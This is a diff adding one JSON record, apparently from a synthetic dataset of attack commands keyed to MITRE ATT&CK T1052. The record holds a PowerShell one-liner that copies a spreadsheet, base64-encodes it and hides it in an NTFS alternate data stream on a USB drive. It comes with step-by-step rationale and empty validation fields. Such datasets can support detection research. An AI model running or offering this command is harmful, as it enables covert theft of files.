@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; $carrier=Join-Path $usb 'thumbs.db'; if(-not (Test-Path $carrier)){ [IO.File]::WriteAllBytes($carrier,[byte[]]@()) }; [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\Budget.xlsx')) | Out-File -Encoding ASCII ($carrier+':cache')",
+  "explanation": "Stashes base64-encoded content inside an alternate data stream on a file located on the USB device.",
+  "rationale_steps": [
+    "Ensure carrier file exists on removable media",
+    "Base64-encode sensitive file",
+    "Write encoded data to NTFS alternate data stream on USB"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-d8a0c7ce",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
